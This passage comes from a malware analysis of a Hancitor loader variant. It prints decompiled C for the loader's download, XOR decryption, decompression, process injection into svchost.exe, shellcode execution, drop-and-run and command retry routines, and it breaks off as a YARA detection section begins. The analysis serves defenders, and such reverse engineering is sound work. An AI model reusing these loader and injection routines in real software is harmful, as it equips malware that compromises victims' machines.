    if ((0x1ff < *param_4) && (iVar1 = mw_check_custom_signature(param_2), iVar1 == 1)) {
      uVar2 = mw_decrypt_and_decompress(param_2,*param_4,param_3);
      *param_4 = uVar2;
    }
    if (param_5 == 1) {
      if ((*param_4 < 0x200) || (iVar1 = mw_check_mz_header(param_2), iVar1 != 1)) {
        iVar1 = 0;
      }
      else {
        iVar1 = 1;
      }
    }
    else {
      iVar1 = 1;
    }
  }
  else {
    do {
      param_1 = mw_extract_next_url(param_1,local_204);
      if (local_204[0] == '\0') break;
      iVar1 = mw_handle_http_request(local_204,(int)param_2,param_3,(int *)param_4);
      if (iVar1 == 1) {
        if ((0x1ff < *param_4) && (iVar1 = mw_check_custom_signature(param_2), iVar1 == 1)) {
          uVar2 = mw_decrypt_and_decompress(param_2,*param_4,param_3);
          *param_4 = uVar2;
        }
        if (param_5 != 1) {
          return 1;
        }
        if ((0x1ff < *param_4) && (iVar1 = mw_check_mz_header(param_2), iVar1 == 1)) {
          return 1;
        }
      }
    } while (param_1 != (char *)0x0);
    iVar1 = 0;
  }
  return iVar1;
}
```

```c
undefined4 __cdecl mw_check_pipe_delimiter(char *param_1)

{
  while( true ) {
    if (*param_1 == '\0') {
      return 0;
    }
    if (*param_1 == '|') break;
    param_1 = param_1 + 1;
  }
  return 1;
}
```

After a successful download the file is validated, decrypted and decompressed. `param_4` is the total number of bytes read.

According to the documentation of [`InternetReadFile`](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile):

> To ensure all data is retrieved, an application must continue to call the InternetReadFile function until the function returns **TRUE** and the *lpdwNumberOfBytesRead* parameter equals zero.

```c
undefined4 __cdecl mw_handle_http_request(undefined4 param_1,int param_2,int param_3,int *param_4)

{
...
            HttpQueryInfoA(local_8,0x20000013,&local_20,&local_2c,0);
            if ((local_20 == 200) && (param_2 != 0)) {
              *param_4 = 0;
              while ((local_30 = InternetReadFile(local_8,param_2,param_3,&local_c), local_30 == 1
                     && (local_c != 0))) {
                param_2 = param_2 + local_c;
                param_3 = param_3 - local_c;
                *param_4 = *param_4 + local_c;
                local_30 = 1;
              }
            }
```

```c
undefined4 __cdecl mw_check_custom_signature(char *param_1)

{
  undefined4 uVar1;
  
  if ((((*param_1 == -0x80) && (param_1[1] == -0x58)) && (param_1[2] == '\x15')) &&
     (param_1[3] == 'T')) {
    uVar1 = 1;
  }
  else {
    uVar1 = 0;
  }
  return uVar1;
}
```

```c
int __cdecl mw_decrypt_and_decompress(undefined *param_1,uint param_2,SIZE_T param_3)

{
  int local_14;
  int local_10;
  undefined *local_c;
  uint local_8;
  
  local_c = (undefined *)mw_heap_alloc_w(param_3);
  for (local_8 = 8; local_8 < param_2; local_8 = local_8 + 1) {
    param_1[local_8] = param_1[local_8] ^ param_1[local_8 % 8];
  }
  local_10 = RtlDecompressBuffer(2,local_c,param_3,param_1 + 8,param_2 - 8,&local_14);
  if (local_10 == 0) {
    mw_memcpy(param_1,local_c,local_14);
  }
  mw_heap_free_w(local_c);
  if (local_10 != 0) {
    local_14 = 0;
  }
  return local_14;
}
```
> [`RtlDecompressBuffer`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtldecompressbuffer)

Optionally, additional size and MZ header checks can be enabled by `param_5`.

Single URL:

```c
int __cdecl
mw_download_pe_file(char *param_1,char *param_2,SIZE_T param_3,uint *param_4,int param_5)

{
...
      uVar2 = mw_decrypt_and_decompress(param_2,*param_4,param_3);
      *param_4 = uVar2;
    }
    if (param_5 == 1) {
      if ((*param_4 < 0x200) || (iVar1 = mw_check_mz_header(param_2), iVar1 != 1)) {
        iVar1 = 0;
      }
      else {
        iVar1 = 1;
      }
    }
    else {
      iVar1 = 1;
    }
...
```

Multiple URLs:

```c
int __cdecl
mw_download_pe_file(char *param_1,char *param_2,SIZE_T param_3,uint *param_4,int param_5)

{
...
          uVar2 = mw_decrypt_and_decompress(param_2,*param_4,param_3);
          *param_4 = uVar2;
        }
        if (param_5 != 1) {
          return 1;
        }
        if ((0x1ff < *param_4) && (iVar1 = mw_check_mz_header(param_2), iVar1 == 1)) {
          return 1;
        }
...
```

```c
undefined4 __cdecl mw_check_mz_header(char *param_1)

{
  undefined4 uVar1;
  
  if ((*param_1 == 'M') && (param_1[1] == 'Z')) {
    uVar1 = 1;
  }
  else {
    uVar1 = 0;
  }
  return uVar1;
}
```

After a successful download, a `svchost.exe` process is launched.

```c
DWORD __cdecl mw_launch_and_inject_svchost(char *param_1,undefined4 param_2)

{
  int iVar1;
  LPVOID local_18;
  DWORD local_14;
  HANDLE local_10;
  DWORD local_c;
  HANDLE local_8;
  
  local_c = 0xffffffff;
  iVar1 = mw_check_mz_header(param_1);
  if (iVar1 == 0) {
    local_c = 0;
  }
  else {
    iVar1 = mw_launch_svchost(&local_8,&local_10);
    if (iVar1 != 0) {
      iVar1 = mw_inject(local_8,param_1,param_2,&local_18,(int *)&local_14);
      if ((iVar1 == 1) &&
         (iVar1 = mw_inject_and_resume(local_8,local_10,local_18,local_14), iVar1 == 1)) {
        local_c = GetProcessId(local_8);
      }
      if (local_c == 0xffffffff) {
        TerminateProcess(local_8,0);
      }
      CloseHandle(local_10);
      CloseHandle(local_8);
    }
  }
  return local_c;
}
```

```c
int __cdecl mw_launch_svchost(HANDLE *param_1,HANDLE *param_2)

{
  BOOL BVar1;
  CHAR local_15c [260];
  _STARTUPINFOA local_58;
  _PROCESS_INFORMATION local_14;
  
  mw_memset((undefined *)&local_58,0,0x44);
  local_58.cb = 0x44;
  GetEnvironmentVariableA(s_SystemRoot_100042e4,local_15c,0x104);
  lstrcatA(local_15c,s_\System32\svchost.exe_100042f0);
  BVar1 = CreateProcessA((LPCSTR)0x0,local_15c,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0
                         ,0,0x424,(LPVOID)0x0,(LPCSTR)0x0,&local_58,&local_14);
  if (BVar1 != 0) {
    *param_1 = local_14.hProcess;
    *param_2 = local_14.hThread;
  }
  return (uint)(BVar1 != 0);
}
```
> [`GetEnvironmentVariableA`](https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea)

> [`CreateProcessA`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

The downloaded file is injected into the previously launched `svchost.exe` using common techniques via Windows APIs.

```c
int __cdecl
mw_inject(HANDLE param_1,undefined *param_2,undefined4 param_3,LPVOID *param_4,int *param_5)

{
  int iVar1;
  SIZE_T dwSize;
  int iVar2;
  BOOL BVar3;
  int local_1c;
  LPVOID local_10;
  undefined *local_c;
  LPVOID local_8;
  
  iVar1 = *(int *)(param_2 + 0x3c);
  local_10 = *(LPVOID *)(param_2 + iVar1 + 0x34);
  dwSize = *(SIZE_T *)(param_2 + iVar1 + 0x50);
  local_c = (undefined *)0x0;
  local_1c = 0;
  local_8 = VirtualAllocEx(param_1,local_10,dwSize,0x3000,0x40);
  if (local_8 == (LPVOID)0x0) {
    local_10 = VirtualAllocEx(param_1,(LPVOID)0x0,dwSize,0x3000,0x40);
    local_8 = local_10;
  }
  if (((local_8 != (LPVOID)0x0) &&
      (local_c = (undefined *)mw_heap_alloc_w(dwSize), local_c != (undefined *)0x0)) &&
     (iVar2 = FUN_10003a00(param_2,param_3,local_c,(int)local_10), iVar2 != 0)) {
    if (param_4 != (LPVOID *)0x0) {
      *param_4 = local_10;
    }
    if (param_5 != (int *)0x0) {
      *param_5 = (int)local_10 + *(int *)(param_2 + iVar1 + 0x28);
    }
    BVar3 = WriteProcessMemory(param_1,local_8,local_c,dwSize,(SIZE_T *)0x0);
    if (BVar3 != 0) {
      local_1c = 1;
    }
  }
  if (local_c != (undefined *)0x0) {
    mw_heap_free_w(local_c);
  }
  if ((local_8 != (LPVOID)0x0) && (local_1c == 0)) {
    VirtualFreeEx(param_1,local_8,0,0x8000);
  }
  return local_1c;
}
```

> [`VirtualAllocEx`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
> [`WriteProcessMemory`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

```c
undefined4 __cdecl
mw_inject_and_resume(HANDLE param_1,HANDLE param_2,undefined4 param_3,DWORD param_4)

{
  BOOL BVar1;
  undefined4 uVar2;
  CONTEXT local_2d0;
  
  local_2d0.ContextFlags = 0x10002;
  mw_memset((undefined *)&local_2d0.Dr0,0,0x2c8);
  BVar1 = GetThreadContext(param_2,&local_2d0);
  if (BVar1 == 0) {
    uVar2 = 0;
  }
  else {
    BVar1 = WriteProcessMemory(param_1,(LPVOID)(local_2d0.Ebx + 8),&param_3,4,(SIZE_T *)0x0);
    if (BVar1 == 0) {
      uVar2 = 0;
    }
    else {
      local_2d0.Eax = param_4;
      BVar1 = SetThreadContext(param_2,&local_2d0);
      if (BVar1 == 0) {
        uVar2 = 0;
      }
      else {
        ResumeThread(param_2);
        uVar2 = 1;
      }
    }
  }
  return uVar2;
}
```
> [`GetThreadContext`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext)
> [`SetThreadContext`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)
> [`ResumeThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)

The `param_4` of `mw_inject_and_resume` (`param_5` of `mw_inject`) is the entry point of the injected binary.

```c
DWORD __cdecl mw_launch_and_inject_svchost(char *param_1,undefined4 param_2)

{
...
  DWORD local_14;
...
      iVar1 = mw_inject(local_8,param_1,param_2,&local_18,(int *)&local_14);
...
         (iVar1 = mw_inject_and_resume(local_8,local_10,local_18,local_14), iVar1 == 1)) {
...
```
```c
int __cdecl
mw_inject(HANDLE param_1,undefined *param_2,undefined4 param_3,LPVOID *param_4,int *param_5)

{
...
  iVar1 = *(int *)(param_2 + 0x3c);
...
    local_10 = VirtualAllocEx(param_1,(LPVOID)0x0,dwSize,0x3000,0x40);
...
    if (param_5 != (int *)0x0) {
      *param_5 = (int)local_10 + *(int *)(param_2 + iVar1 + 0x28);
    }
...
```

According to [https://www.aldeid.com/wiki/PE-Portable-executable](https://www.aldeid.com/wiki/PE-Portable-executable):
> MS DOS Header
>
> Offset  Size  Member 	  Meaning 
>
> ...
>
> 0x3c    DWORD e_lfanew  Offset to start of PE header 
>
> ...
>
> PE Header
>
> Offset 	Size 	Member 	             Meaning
>
> ...
>
> 0x28    DWORD AddressOfEntryPoint  The address of the entry point... 

#### command `e`

Summary: this command downloads the PE file (available at the specified URL(s)) then executes it in the context of the current process. The PE file can be either a `.dll` or `.exe`, but this Hancitor variant only supports executing `.exe` files via the `e` command.

```c
int __cdecl mw_execute_pe_w(char *param_1,int param_2)

{
  char *pcVar1;
  int iVar2;
  int local_10;
  SIZE_T local_8;
  
  local_8 = 0x500000;
  pcVar1 = (char *)mw_heap_alloc_w(0x500000);
  iVar2 = mw_download_pe_file(param_1,pcVar1,local_8,&local_8,1);
  if (iVar2 == 1) {
    mw_execute_pe(pcVar1,local_8,0,param_2);
  }
  local_10 = (int)(iVar2 == 1);
  mw_heap_free_w(pcVar1);
  return local_10;
}
```

Call graph of `mw_execute_pe_w`:

```
OrderedCallGraphGenerator.java> Running...
OrderedCallGraphGenerator.java> 
mw_execute_pe_w @ 10001e00
  mw_heap_alloc_w @ 10001390
    GetProcessHeap @ EXTERNAL:00000114
    HeapAlloc @ EXTERNAL:0000005b
  mw_download_pe_file @ 10002230
    mw_check_pipe_delimiter @ 10002880
    mw_handle_http_request @ 10001fe0
      mw_memset @ 100014a0
      InternetCrackUrlA @ EXTERNAL:00000052
      mw_open_connection @ 100024f0
        InternetOpenA @ EXTERNAL:0000004e
      InternetConnectA @ EXTERNAL:00000057
      HttpOpenRequestA @ EXTERNAL:00000053
      InternetCloseHandle @ EXTERNAL:00000050
      InternetQueryOptionA @ EXTERNAL:00000055
      InternetSetOptionA @ EXTERNAL:00000054
      HttpSendRequestA @ EXTERNAL:0000004f
      HttpQueryInfoA @ EXTERNAL:00000051
      InternetReadFile @ EXTERNAL:00000056
    mw_check_custom_signature @ 10002810
    mw_decrypt_and_decompress @ 10001d40
      mw_heap_alloc_w @ 10001390 [already visited!]
      RtlDecompressBuffer @ EXTERNAL:00000059
      mw_memcpy @ 10001450
      mw_heap_free_w @ 100013d0
        HeapFree @ EXTERNAL:00000115
    mw_check_mz_header @ 10002b40
    mw_extract_next_url @ 10002720
  mw_execute_pe @ 10003730
    mw_check_mz_header @ 10002b40 [already visited!]
    mw_map_pe_w @ 10003180
      VirtualAlloc @ EXTERNAL:0000012d
      mw_map_pe @ 10003a00
        mw_memcpy @ 10001450 [already visited!]
        mw_process_relocs @ 10003470
      VirtualFree @ EXTERNAL:0000012e
    mw_resolve_imports @ 10003580
      GetModuleHandleA @ EXTERNAL:00000132
      LoadLibraryA @ EXTERNAL:00000134
      GetProcAddress @ EXTERNAL:00000060
    mw_thread_start @ 100039a0
    CreateThread @ EXTERNAL:0000005e
    CloseHandle @ EXTERNAL:0000011e
  mw_heap_free_w @ 100013d0 [already visited!]

OrderedCallGraphGenerator.java> Finished!
```

`mw_execute_pe` supports different execution modes but all of them execute the PE file in the context of the current process.

```c
undefined4 __cdecl mw_execute_pe(char *param_1,undefined4 param_2,int param_3,int param_4)

{
  int iVar1;
  undefined4 uVar2;
  code *entry_point;
  HANDLE local_c;
  LPVOID image_base;
  
  iVar1 = mw_check_mz_header(param_1);
  if (iVar1 == 0) {
    uVar2 = 0;
  }
  else {
    iVar1 = mw_map_pe_w(param_1,param_2,&image_base,&entry_point);
    if (iVar1 == 1) {
      mw_resolve_imports((int)image_base);
      if (param_3 == 1) {
        local_c = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,mw_thread_start,image_base,0,
                               (LPDWORD)0x0);
        if (local_c != (HANDLE)0x0) {
          CloseHandle(local_c);
        }
      }
      else if (param_4 == 1) {
        (*entry_point)(image_base,1,0);
      }
      else {
        (*entry_point)();
      }
      uVar2 = 1;
    }
    else {
      uVar2 = 0;
    }
  }
  return uVar2;
}
```

Where `image_base` and `entry_point` are set by `mw_map_pe_w` which handles the parsing and mapping of the PE file.

```c
int __cdecl mw_map_pe_w(undefined *param_1,undefined4 param_2,LPVOID *param_3,LPVOID *param_4)

{
  int iVar1;
  int local_14;
  undefined *image_base;
  undefined *local_8;
  int e_lfanew;
  SIZE_T size_of_image;
  
  e_lfanew = *(int *)(param_1 + 0x3c);
  image_base = *(undefined **)(param_1 + e_lfanew + 0x34);
  size_of_image = *(SIZE_T *)(param_1 + e_lfanew + 0x50);
  local_14 = 0;
  local_8 = (undefined *)VirtualAlloc(image_base,size_of_image,0x3000,0x40);
  if (local_8 == (undefined *)0x0) {
    image_base = (undefined *)VirtualAlloc((LPVOID)0x0,size_of_image,0x3000,0x40);
    local_8 = image_base;
  }
  if ((local_8 != (undefined *)0x0) &&
     (iVar1 = mw_map_pe(param_1,param_2,local_8,(int)image_base), iVar1 == 1)) {
    if (param_3 != (LPVOID *)0x0) {
      *param_3 = image_base;
    }
    if (param_4 != (LPVOID *)0x0) {
      *param_4 = image_base + *(int *)(param_1 + e_lfanew + 0x28);
    }
    local_14 = 1;
  }
  if ((local_8 != (undefined *)0x0) && (local_14 == 0)) {
    VirtualFree(local_8,0,0x8000);
  }
  return local_14;
}
```

If `param_3` of `mw_execute_pe` is set to 1, a new thread is spawned. `param_3` is hardcoded as 0 though so this branch is unreachable.

```c
int __cdecl mw_execute_pe_w(char *param_1,int param_2)

{
...
    mw_execute_pe(pcVar1,local_8,0,param_2);
...
```

If `param_4` is set to 1, 3 parameters are passed when transferring the execution to `entry_point`. This mechanism is implemented to support executing DLLs:

- [https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain](https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain)
- [https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-entry-point-function](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-entry-point-function)

> The following example demonstrates how to structure the DLL entry-point function.
> ```c
> BOOL WINAPI DllMain(
>     HINSTANCE hinstDLL,  // handle to DLL module
>     DWORD fdwReason,     // reason for calling function
>     LPVOID lpReserved )  // reserved
> {
>     // Perform actions based on the reason for calling.
>     switch( fdwReason ) 
>     { 
>         case DLL_PROCESS_ATTACH:
>          // Initialize once for each new process.
>          // Return FALSE to fail DLL load.
>             break;
> ...
> ```

> *hinstDLL* [in]
>
>    A handle to the DLL module. The value is the base address of the DLL. ...
>
> *fdwReason* [in]
>
>    The reason code that indicates why the DLL entry-point function is being called. This parameter can be one of the following values.
> ... 
> DLL_PROCESS_ATTACH 1
>
> *lpvReserved* [in]
>
>    If *fdwReason* is **DLL_PROCESS_ATTACH**, *lpvReserved* is **NULL** for dynamic loads and non-NULL for static loads.

If `param_4` of `mw_execute_pe` is set to 0, no parameters are passed when transferring the execution to `entry_point`. This mechanism is implemented to support executable files.

`param_4` is hardcoded as 0 so this Hancitor variant does not support executing functions in DLL files via `mw_execute_pe_w`.

```c
int __cdecl mw_execute_cmd(char *param_1,int *param_2)

{
...
    case 'e':
      iVar2 = mw_execute_pe_w(param_1 + 2,0);
```

#### command `l`

Summary: this command downloads a shellcode (available at the specified URL(s)) then executes it either in the context of the current process or launches an `svchost.exe` process and injects it into that.

```c
int __cdecl mw_execute_shellcode_w(char *param_1,int param_2,int param_3)

{
  char *pcVar1;
  int iVar2;
  int local_10;
  SIZE_T local_8;
  
  local_8 = 0x500000;
  pcVar1 = (char *)mw_heap_alloc_w(0x500000);
  iVar2 = mw_download_pe_file(param_1,pcVar1,local_8,&local_8,0);
  if (iVar2 == 1) {
    mw_execute_shellcode(pcVar1,local_8,param_2,param_3);
  }
  local_10 = (int)(iVar2 == 1);
  mw_heap_free_w(pcVar1);
  return local_10;
}
```

Call graph of `mw_execute_shellcode_w`:

```
OrderedCallGraphGenerator.java> Running...
OrderedCallGraphGenerator.java> 
mw_execute_shellcode_w @ 10001f60
  mw_heap_alloc_w @ 10001390
    GetProcessHeap @ EXTERNAL:00000114
    HeapAlloc @ EXTERNAL:0000005b
  mw_download_pe_file @ 10002230
    mw_check_pipe_delimiter @ 10002880
    mw_handle_http_request @ 10001fe0
      mw_memset @ 100014a0
      InternetCrackUrlA @ EXTERNAL:00000052
      mw_open_connection @ 100024f0
        InternetOpenA @ EXTERNAL:0000004e
      InternetConnectA @ EXTERNAL:00000057
      HttpOpenRequestA @ EXTERNAL:00000053
      InternetCloseHandle @ EXTERNAL:00000050
      InternetQueryOptionA @ EXTERNAL:00000055
      InternetSetOptionA @ EXTERNAL:00000054
      HttpSendRequestA @ EXTERNAL:0000004f
      HttpQueryInfoA @ EXTERNAL:00000051
      InternetReadFile @ EXTERNAL:00000056
    mw_check_custom_signature @ 10002810
    mw_decrypt_and_decompress @ 10001d40
      mw_heap_alloc_w @ 10001390 [already visited!]
      RtlDecompressBuffer @ EXTERNAL:00000059
      mw_memcpy @ 10001450
      mw_heap_free_w @ 100013d0
        HeapFree @ EXTERNAL:00000115
    mw_check_mz_header @ 10002b40
    mw_extract_next_url @ 10002720
  mw_execute_shellcode @ 10003880
    mw_launch_svchost @ 10002c40
      mw_memset @ 100014a0 [already visited!]
      GetEnvironmentVariableA @ EXTERNAL:0000011f
      lstrcatA @ EXTERNAL:0000005d
      CreateProcessA @ EXTERNAL:00000120
    VirtualAllocEx @ EXTERNAL:0000012f
    WriteProcessMemory @ EXTERNAL:00000130
    CreateRemoteThread @ EXTERNAL:0000005f
    CloseHandle @ EXTERNAL:0000011e
    VirtualAlloc @ EXTERNAL:0000012d
    mw_memcpy @ 10001450 [already visited!]
    mw_thread_start_shellcode @ 100039e0
    CreateThread @ EXTERNAL:0000005e
  mw_heap_free_w @ 100013d0 [already visited!]

OrderedCallGraphGenerator.java> Finished!
```

```c
undefined4 __cdecl mw_execute_shellcode(undefined *param_1,SIZE_T param_2,int param_3,int param_4)

{
  int iVar1;
  BOOL BVar2;
  DWORD local_24;
  HANDLE local_20;
  code *local_1c;
  HANDLE local_18;
  HANDLE local_14;
  HANDLE local_10;
  LPTHREAD_START_ROUTINE local_c;
  code *local_8;
  
  if (param_3 == 0) {
    local_8 = (code *)VirtualAlloc((LPVOID)0x0,param_2,0x3000,0x40);
    if (local_8 != (code *)0x0) {
      mw_memcpy(local_8,param_1,param_2);
      if (param_4 == 0) {
        local_1c = local_8;
        (*local_8)();
        return 1;
      }
      local_18 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,mw_thread_start_shellcode,local_8,0,
                              (LPDWORD)0x0);
      if (local_18 != (HANDLE)0x0) {
        CloseHandle(local_18);
        return 1;
      }
    }
  }
  else {
    iVar1 = mw_launch_svchost(&local_10,&local_20);
    if (iVar1 == 0) {
      return 0;
    }
    local_c = (LPTHREAD_START_ROUTINE)VirtualAllocEx(local_10,(LPVOID)0x0,param_2,0x3000,0x40);
    if (((local_c != (LPTHREAD_START_ROUTINE)0x0) &&
        (BVar2 = WriteProcessMemory(local_10,local_c,param_1,param_2,(SIZE_T *)0x0), BVar2 != 0)) &&
       (local_14 = CreateRemoteThread(local_10,(LPSECURITY_ATTRIBUTES)0x0,0,local_c,(LPVOID)0x0,0,
                                      &local_24), local_14 != (HANDLE)0x0)) {
      CloseHandle(local_14);
      return 1;
    }
  }
  return 0;
}
```
> [`CreateThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)

> [`CreateRemoteThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

```c
undefined4 mw_thread_start_shellcode(undefined *param_1)

{
  (*(code *)param_1)();
  return 0;
}
```

This variant always spawns a `svchost.exe` and injects the shellcode into it, since `param_3` of `mw_execute_shellcode` is hardcoded as 1.


```c
int __cdecl mw_execute_cmd(char *param_1,int *param_2)

{
...
    case 'l':
      iVar2 = mw_execute_shellcode_w(param_1 + 2,1,1);
...
```

#### command `n`

This command is a `nop` as it does nothing.

```c
int __cdecl mw_execute_cmd(char *param_1,int *param_2)

{
...
    case 'n':
      *param_2 = 1;
      iVar1 = 1;
      break;
...
```

#### command `r`

Summary: this command downloads the PE file (available at the specified URL(s)) then writes it to a temp file. Then it spawns it as a new process in the security context of the current process. It checks if it is a `.dll`, in this case it uses `Rundll32.exe` to run it.

```c
int __cdecl mw_drop_and_execute_w(char *param_1)

{
  char *pcVar1;
  int iVar2;
  int local_10;
  SIZE_T local_8;
  
  local_8 = 0x500000;
  pcVar1 = (char *)mw_heap_alloc_w(0x500000);
  iVar2 = mw_download_pe_file(param_1,pcVar1,local_8,&local_8,1);
  if (iVar2 == 1) {
    mw_drop_and_execute(pcVar1,local_8);
  }
  local_10 = (int)(iVar2 == 1);
  mw_heap_free_w(pcVar1);
  return local_10;
}
```

Call graph of `mw_drop_and_execute_w`:

```
OrderedCallGraphGenerator.java> Running...
OrderedCallGraphGenerator.java> 
mw_drop_and_execute_w @ 10001ef0
  mw_heap_alloc_w @ 10001390
    GetProcessHeap @ EXTERNAL:00000114
    HeapAlloc @ EXTERNAL:0000005b
  mw_download_pe_file @ 10002230
    mw_check_pipe_delimiter @ 10002880
    mw_handle_http_request @ 10001fe0
      mw_memset @ 100014a0
      InternetCrackUrlA @ EXTERNAL:00000052
      mw_open_connection @ 100024f0
        InternetOpenA @ EXTERNAL:0000004e
      InternetConnectA @ EXTERNAL:00000057
      HttpOpenRequestA @ EXTERNAL:00000053
      InternetCloseHandle @ EXTERNAL:00000050
      InternetQueryOptionA @ EXTERNAL:00000055
      InternetSetOptionA @ EXTERNAL:00000054
      HttpSendRequestA @ EXTERNAL:0000004f
      HttpQueryInfoA @ EXTERNAL:00000051
      InternetReadFile @ EXTERNAL:00000056
    mw_check_custom_signature @ 10002810
    mw_decrypt_and_decompress @ 10001d40
      mw_heap_alloc_w @ 10001390 [already visited!]
      RtlDecompressBuffer @ EXTERNAL:00000059
      mw_memcpy @ 10001450
      mw_heap_free_w @ 100013d0
        HeapFree @ EXTERNAL:00000115
    mw_check_mz_header @ 10002b40
    mw_extract_next_url @ 10002720
  mw_drop_and_execute @ 10003b30
    GetTempPathA @ EXTERNAL:0000013a
    GetTempFileNameA @ EXTERNAL:0000013b
    mw_write_to_file @ 10003ac0
      CreateFileA @ EXTERNAL:00000138
      WriteFile @ EXTERNAL:00000139
      CloseHandle @ EXTERNAL:0000011e
    mw_check_if_dll @ 100033c0
    wsprintfA @ EXTERNAL:00000062
    mw_create_process_w @ 100036c0
      mw_memset @ 100014a0 [already visited!]
      CreateProcessA @ EXTERNAL:00000120
      CloseHandle @ EXTERNAL:0000011e
  mw_heap_free_w @ 100013d0 [already visited!]

OrderedCallGraphGenerator.java> Finished!
```

The temp files can be recognized by having the `BN` prefix.

```c
bool __cdecl mw_drop_and_execute(LPCVOID param_1,DWORD param_2)

{
  bool bVar1;
  int iVar2;
  CHAR local_310 [260];
  CHAR local_20c [260];
  CHAR local_108 [260];
  
  GetTempPathA(0x104,local_20c);
  GetTempFileNameA(local_20c,s_BN_100042c0,0,local_108);
  iVar2 = mw_write_to_file(local_108,param_1,param_2);
  if (iVar2 == 1) {
    iVar2 = mw_check_if_dll((int)param_1);
    if (iVar2 == 1) {
      wsprintfA(local_310,s_Rundll32.exe_%s,_start_100042c4,local_108);
      bVar1 = mw_create_process_w(local_310);
    }
    else {
      bVar1 = mw_create_process_w(local_108);
    }
  }
  else {
    bVar1 = false;
  }
  return bVar1;
}
```

> [`GetTempPathA`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-gettemppatha)

> [`GetTempFileNameA`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-gettempfilenamea)

```c
undefined4 __cdecl mw_write_to_file(LPCSTR param_1,LPCVOID param_2,DWORD param_3)

{
  HANDLE hFile;
  
  if (((param_2 != (LPCVOID)0x0) && (param_3 != 0)) &&
     (hFile = CreateFileA(param_1,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0),
     hFile != (HANDLE)0xffffffff)) {
    WriteFile(hFile,param_2,param_3,&param_3,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
    return 1;
  }
  return 0;
}
```

> [`CreateFileA`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)

> [`WriteFile`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile)

The file type is determined by checking the [`Characteristics` flags](https://www.aldeid.com/wiki/PE-Portable-executable#Image_Characteristics). If `IMAGE_FILE_DLL` (0x2000) is set then the file is a `.dll`.

```c
int __cdecl mw_check_if_dll(int param_1)

{
  return (uint)((*(ushort *)(param_1 + *(int *)(param_1 + 0x3c) + 0x16) & 0x2000) != 0);
}
```

Then finally the process is spawned.

```c
bool __cdecl mw_create_process_w(LPSTR param_1)

{
  BOOL BVar1;
  STARTUPINFO local_58;
  _PROCESS_INFORMATION local_14;
  
  local_58.cb = 0x44;
  mw_memset((undefined *)&local_58.lpReserved,0,0x40);
  BVar1 = CreateProcessA((LPCSTR)0x0,param_1,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0
                         ,0,(LPVOID)0x0,(LPCSTR)0x0,&local_58,&local_14);
  if (BVar1 != 0) {
    CloseHandle(local_14.hProcess);
    CloseHandle(local_14.hThread);
  }
  return BVar1 != 0;
}
```

#### Retry logic

The failed commands are stored and retried later.

```c
void mw_main(void)

{
...
          iVar1 = mw_execute_cmd(local_8,&local_1c);
          if ((iVar1 == 1) && (local_1c == 0)) {
            mw_store_failed_cmd(local_8);
          }
...
    Sleep(60000);
    mw_retry_failed_cmd();
    Sleep(60000);
...
```

```c
undefined4 __cdecl mw_store_failed_cmd(LPCSTR param_1)

{
  LPVOID pvVar1;
  uint local_8;
  
  local_8 = 0;
  while( true ) {
    if (0x1f < local_8) {
      return 0;
    }
    if (*(int *)(&DAT_10007160 + local_8 * 4) == 0) break;
    local_8 = local_8 + 1;
  }
  pvVar1 = mw_heap_alloc_w(0x200);
  *(LPVOID *)(&DAT_10007160 + local_8 * 4) = pvVar1;
  *(undefined4 *)(&DAT_100071e0 + local_8 * 4) = 0x14;
  lstrcpyA(*(LPSTR *)(&DAT_10007160 + local_8 * 4),param_1);
  return 1;
}
```

```c
void mw_retry_failed_cmd(void)

{
  int local_10;
  char *local_c;
  uint local_8;
  
  for (local_8 = 0; local_8 < 0x20; local_8 = local_8 + 1) {
    local_c = (char *)mw_process_pending_cmd(local_8);
    if (local_c != (char *)0x0) {
      local_10 = 0;
      mw_execute_cmd(local_c,&local_10);
      if (local_10 == 1) {
        mw_remove_executed_cmd(local_8);
      }
    }
  }
  return;
}
```

Upon successful execution the previously failed commands are removed from the list.

```c
bool __cdecl mw_remove_executed_cmd(int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(&DAT_10007160 + param_1 * 4);
  if (iVar1 != 0) {
    mw_heap_free_w(*(LPVOID *)(&DAT_10007160 + param_1 * 4));
    *(undefined4 *)(&DAT_10007160 + param_1 * 4) = 0;
    *(undefined4 *)(&DAT_100071e0 + param_1 * 4) = 0;
  }
  return iVar1 != 0;
}
```

### YARA

Note: the rules are available [here](https://github.com/gemesa/threat-detection-rules) as well.

#### Packed binary

DiE cant identify the packer, maybe it is custom made. Without diving deep into the packer mechanism, I created the following YARA rule manually. This rule might not be strict enough, it might make sense to auto generate a YARA rule using [yarGen](https://github.com/Neo23x0/yarGen) or similar alternatives as a future improvement.

```
import "pe"

rule hancitor_packed {
